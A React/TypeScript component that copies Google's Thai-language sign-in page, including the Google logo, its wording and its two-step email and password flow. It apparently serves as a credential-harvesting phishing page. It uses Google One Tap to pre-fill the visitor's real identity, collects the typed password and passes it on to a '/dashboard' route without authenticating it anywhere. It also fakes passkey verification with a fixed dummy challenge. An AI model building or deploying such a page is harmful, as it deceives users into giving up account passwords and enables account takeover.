import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import './GoogleSignIn.css';

declare global {
  interface Window {
    google?: any;
    PublicKeyCredential?: any;
  }
}

export const GoogleSignIn: React.FC = () => {
  const navigate = useNavigate();
  const CLIENT_ID = import.meta.env.VITE_GOOGLE_CLIENT_ID || "104321837513-7jdtqfgtebrr0qo0aoautonolngvks8e.apps.googleusercontent.com";

  const [step, setStep] = useState<1 | 2>(1);
  const [email, setEmail] = useState<string>('');
  const [password, setPassword] = useState<string>('');
  const [showPassword, setShowPassword] = useState<boolean>(false);
  const [userAccount, setUserAccount] = useState<{ name: string; email: string; picture?: string } | null>(null);

  const passwordInputRef = useRef<HTMLInputElement>(null);

  // ถอดรหัส Google One Tap Token
  const handleCredentialResponse = (response: any) => {
    try {
      const base64Url = response.credential.split('.')[1];
      const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
      const jsonPayload = decodeURIComponent(
        atob(base64)
          .split('')
          .map((c) => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2))
          .join('')
      );
      const data = JSON.parse(jsonPayload);

      const accountData = {
        name: data.name || data.email.split('@')[0],
        email: data.email,
        picture: data.picture,
      };

      setUserAccount(accountData);
      setEmail(data.email);
      setStep(2);
    } catch (error) {
      console.error('Failed to parse Google Token:', error);
    }
  };

  // โหลด Google Script + เรียกซิงค์ Google One Tap
  useEffect(() => {
    const script = document.createElement('script');
    script.src = 'https://accounts.google.com/gsi/client';
    script.async = true;
    script.defer = true;

    script.onload = () => {
      if (window.google) {
        window.google.accounts.id.initialize({
          client_id: CLIENT_ID,
          callback: handleCredentialResponse,
          auto_select: true,
        });
        window.google.accounts.id.prompt();
      }
    };

    document.head.appendChild(script);
    return () => {
      document.head.removeChild(script);
    };
  }, [CLIENT_ID]);

  // ซิงค์ Passkey อัตโนมัติจากเบราว์เซอร์/เครื่อง
  useEffect(() => {
    if (step === 2 && window.PublicKeyCredential && window.PublicKeyCredential.isConditionalMediationAvailable) {
      window.PublicKeyCredential.isConditionalMediationAvailable().then((isAvailable: boolean) => {
        if (isAvailable) {
          navigator.credentials.get({
            mediation: 'conditional',
            publicKey: {
              challenge: new Uint8Array([1, 2, 3, 4]), // จำลอง challenge สำหรับ Passkey
              timeout: 60000,
              userVerification: 'preferred',
            }
          } as any).then((credential) => {
            if (credential) {
              // หากยืนยัน Passkey จากเครื่องสำเร็จ จะนำเข้าหน้า Dashboard ทันที
              navigate('/dashboard', { state: { account: userAccount, authMethod: 'passkey' } });
            }
          }).catch((err) => {
            console.log('Passkey Conditional UI active or cancelled:', err);
          });
        }
      });
    }
  }, [step, navigate, userAccount]);

  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (email.trim()) {
      if (!userAccount) {
        setUserAccount({
          name: email.split('@')[0],
          email: email,
        });
      }
      setStep(2);
    }
  };

  const handlePasswordSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (password) {
      navigate('/dashboard', { state: { account: userAccount, password } });
    }
  };

  return (
    <div className="google-page-wrapper">
      <main className="google-card">
        <div className="google-logo">
          <svg width="48" height="48" viewBox="0 0 24 24">
            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
            <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/>
            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/>
          </svg>
        </div>

        {step === 1 && (
          <div className="fade-in">
            <h1 className="title">ลงชื่อเข้าใช้งาน</h1>
            <p className="subtitle">ไปยังบัญชี Google ของคุณ</p>

            <form onSubmit={handleEmailSubmit}>
              <div className="material-input">
                <input
                  type="email"
                  required
                  autoComplete="username webauthn"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder=" "
                />
                <label>อีเมลหรือโทรศัพท์</label>
              </div>

              <div className="forgot-link">
                <a href="#forgot" onClick={(e) => e.preventDefault()}>หากจำอีเมลไม่ได้ใช่ไหม</a>
              </div>

              <p className="terms-text">
                ไม่ใช่คอมพิวเตอร์ของคุณใช่ไหม ใช้หน้าต่างการท่องเว็บแบบส่วนตัวเพื่อลงชื่อเข้าใช้ <a href="#learn">เรียนรู้เพิ่มเติม</a>
              </p>

              <div className="button-row">
                <button type="button" className="btn-text">สร้างบัญชี</button>
                <button type="submit" className="btn-contained">ถัดไป</button>
              </div>
            </form>
          </div>
        )}

        {step === 2 && (
          <div className="fade-in">
            <h1 className="title">{userAccount?.name || 'ยินดีต้อนรับ'}</h1>

            <div className="account-chip" onClick={() => setStep(1)}>
              {userAccount?.picture ? (
                <img src={userAccount.picture} alt="Avatar" className="chip-avatar" />
              ) : (
                <div className="chip-placeholder">{userAccount?.name[0] || 'G'}</div>
              )}
              <span className="chip-email">{userAccount?.email || email}</span>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="#444746">
                <path d="M7 10l5 5 5-5z" />
              </svg>
            </div>

            <p className="prompt-text">หากต้องการดำเนินการต่อ โปรดยืนยันก่อนว่าเป็นคุณ</p>

            <form onSubmit={handlePasswordSubmit}>
              <div className="material-input">
                <input
                  ref={passwordInputRef}
                  type={showPassword ? 'text' : 'password'}
                  required
                  autoComplete="current-password webauthn"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder=" "
                />
                <label>ป้อนรหัสผ่าน</label>
              </div>

              <div className="checkbox-row">
                <input
                  type="checkbox"
                  id="show-pwd"
                  checked={showPassword}
                  onChange={(e) => setShowPassword(e.target.checked)}
                />
                <label htmlFor="show-pwd">แสดงรหัสผ่าน</label>
              </div>

              <div className="button-row">
                <button type="button" className="btn-text">หากจำรหัสผ่านไม่ได้</button>
                <button type="submit" className="btn-contained">ถัดไป</button>
              </div>
            </form>
          </div>
        )}
      </main>

      <footer className="google-footer">
        <div className="language-selector">ไทย</div>
        <div className="footer-links">
          <a href="#help">ความช่วยเหลือ</a>
          <a href="#privacy">ความเป็นส่วนตัว</a>
          <a href="#terms">ข้อกำหนด</a>
        </div>
      </footer>
    </div>
  );
};
